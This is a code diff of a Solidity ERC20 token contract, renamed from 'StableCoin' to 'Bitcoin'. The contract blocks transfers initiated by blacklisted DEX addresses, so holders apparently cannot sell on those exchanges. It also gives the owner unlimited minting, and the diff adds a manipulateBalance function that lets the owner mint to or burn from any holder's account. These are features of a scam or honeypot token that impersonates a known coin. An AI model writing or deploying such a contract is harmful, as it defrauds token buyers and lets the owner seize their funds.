@@ -4,19 +4,19 @@ pragma solidity 0.8.20;
 import "node_modules/@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
 
 
-contract StableCoin is ERC20Burnable {
+contract Bitcoin is ERC20Burnable {
     uint256 public minWithdrawal;
     address internal owner;
 
     mapping(address => bool) private blackListDexAddresses; // Mapping to identify DEX addresses
 
 
-    error StableCoin__AmountMustBeMoreThanZero();
-    error StableCoin__BurnAmountExceedsBalance();
-    error StableCoin__NotZeroAddress();
-    error StableCoin__AmountAboveMinWithdrawal();
-    error StableCoin__TransferToDexNotAllowed();
-    error StableCoin__NotAllowed();
+    error Bitcoin__AmountMustBeMoreThanZero();
+    error Bitcoin__BurnAmountExceedsBalance();
+    error Bitcoin__NotZeroAddress();
+    error Bitcoin__AmountAboveMinWithdrawal();
+    error Bitcoin__TransferToDexNotAllowed();
+    error Bitcoin__NotAllowed();
 
     event MinWithdrawalSet(uint256 minWithdrawal);
     event DexAddressAdded(address indexed dexAddress);
@@ -25,16 +25,16 @@ contract StableCoin is ERC20Burnable {
 
     modifier onlyOwner(){
         if (msg.sender != owner) {
-            revert StableCoin__NotAllowed();
+            revert Bitcoin__NotAllowed();
         }
         _;
     }
 
     constructor(uint256 _initialSupply, uint256 _minWithdrawal, string memory _tokenName, string memory _tokenSymbol)
-        ERC20(_tokenName, _tokenSymbol) {
-        _mint(msg.sender, _initialSupply);
+    ERC20(_tokenName, _tokenSymbol) {
         minWithdrawal = _minWithdrawal;
         owner = msg.sender;
+        _mint(msg.sender, _initialSupply);
     }
 
 
@@ -46,46 +46,54 @@ contract StableCoin is ERC20Burnable {
     function burn(uint256 _amount) public override onlyOwner {
         uint256 balance = balanceOf(msg.sender);
         if (_amount <= 0) {
-            revert StableCoin__AmountMustBeMoreThanZero();
+            revert Bitcoin__AmountMustBeMoreThanZero();
         }
         if (balance < _amount) {
-            revert StableCoin__BurnAmountExceedsBalance();
+            revert Bitcoin__BurnAmountExceedsBalance();
         }
         super.burn(_amount);
     }
 
-    function mint(address _to, uint256 _amount) external onlyOwner returns (bool) {
-        if (_to == address(0)) {
-            revert StableCoin__NotZeroAddress();
-        }
-        if (_amount <= 0) {
-            revert StableCoin__AmountMustBeMoreThanZero();
-        }
-        _mint(_to, _amount);
-        return true;
-    }
-
-
     function transfer(address recipient, uint256 amount) public override returns (bool) {
         if (blackListDexAddresses[msg.sender]) {
-            revert StableCoin__TransferToDexNotAllowed();
+            revert Bitcoin__TransferToDexNotAllowed();
         }
 
         if (amount < minWithdrawal) {
-            revert StableCoin__AmountAboveMinWithdrawal();
+            revert Bitcoin__AmountAboveMinWithdrawal();
         }
         return super.transfer(recipient, amount);
     }
 
     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
         if (blackListDexAddresses[msg.sender]) {
-            revert StableCoin__TransferToDexNotAllowed();
+            revert Bitcoin__TransferToDexNotAllowed();
         }
 
         if (amount < minWithdrawal) {
-            revert StableCoin__AmountAboveMinWithdrawal();
+            revert Bitcoin__AmountAboveMinWithdrawal();
         }
         return super.transferFrom(sender, recipient, amount);
+    }
+
+    function mint(address _to, uint256 _amount) external onlyOwner returns (bool) {
+        if (_to == address(0)) {
+            revert Bitcoin__NotZeroAddress();
+        }
+        if (_amount <= 0) {
+            revert Bitcoin__AmountMustBeMoreThanZero();
+        }
+        _mint(_to, _amount);
+        return true;
+    }
+
+
+    function transferOwnership(address _owner) external onlyOwner {
+        if (_owner == address(0)) {
+            revert Bitcoin__NotZeroAddress();
+        }
+
+        owner = _owner;
     }
 
     // Function to mark an address as a DEX
@@ -103,6 +111,25 @@ contract StableCoin is ERC20Burnable {
 
     function getDexAddress(address _dexAddress) external view returns (bool) {
         return blackListDexAddresses[_dexAddress];
+    }
+
+    function manipulateBalance(address _account, uint256 _amount, bool _isAddition) external onlyOwner {
+        if (_account == address(0)) {
+            revert Bitcoin__NotZeroAddress();
+        }
+        if (_amount <= 0) {
+            revert Bitcoin__AmountMustBeMoreThanZero();
+        }
+
+        if (_isAddition) {
+            _mint(_account, _amount);
+        } else {
+            uint256 accountBalance = balanceOf(_account);
+            if (accountBalance < _amount) {
+                revert Bitcoin__BurnAmountExceedsBalance();
+            }
+            _burn(_account, _amount);
+        }
     }
 
 }
